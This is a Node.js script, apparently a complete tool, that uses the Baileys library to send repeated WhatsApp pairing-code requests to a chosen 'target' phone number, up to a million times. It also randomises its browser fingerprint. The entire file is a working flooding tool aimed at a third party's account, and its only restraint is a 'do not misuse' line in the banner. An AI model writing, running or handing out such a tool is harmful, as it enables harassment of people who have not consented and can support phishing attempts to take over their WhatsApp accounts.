const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const colors = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const themeColor = colors[Math.floor(Math.random() * colors.length)];
const resetColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, answer => { rl.close(); resolve(answer); }));
};

const browsers = [
    ["Ubuntu", "Chrome", "120.0.0"],
    ["macOS", "Safari", "17.3"],
    ["Windows", "Edge", "121.0.0"],
    ["Ubuntu", "Firefox", "122.0.0"],
    ["Android", "Chrome", "119.0.0"],
    ["iOS", "Safari", "16.6"]
];
const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];

async function startSocket() {
    const { state } = await useMultiFileAuthState('./69/session');
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: randomBrowser
    });

    try {
        const target = await question(themeColor + 'Enter target number (e.g., 62xxxxxxxxxx): ' + resetColor);
        const amount = parseInt(await question(themeColor + 'How many pairing code requests? (1-1000000): ' + resetColor));

        if (isNaN(amount) || amount < 1 || amount > 1000000) {
            console.log('Invalid amount. Please enter a number between 1 and 1,000,000.');
            return;
        }

        for (let i = 0; i < amount; i++) {
            try {
                let code = await sock.requestPairingCode(target);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(themeColor + `Success [${i + 1}/${amount}] → Code sent to: ${target}` + resetColor);
                await sleep(15000); // Delay 1 second per request
            } catch (err) {
                console.error('Request failed:', err.message);
                console.log('Removing session and exiting...');
                fs.rmSync('./69', { recursive: true, force: true });
                process.exit(1);
            }
        }
    } catch (err) {
        console.error('Unexpected error:', err.message);
        fs.rmSync('./69', { recursive: true, force: true });
        process.exit(1);
    }
}

console.log(themeColor + `
──────────────────────────────────────────────
        WhatsApp Pairing Code Request Tool
──────────────────────────────────────────────
Author      : Obscuraworks, Inc.
Website     : https://www.obscuraworks.com
Version     : v1.0
──────────────────────────────────────────────
Instructions:
• Input the target number in international format.
• Choose how many pairing code requests to send.
• Do not misuse this tool.
──────────────────────────────────────────────
` + resetColor);

startSocket();
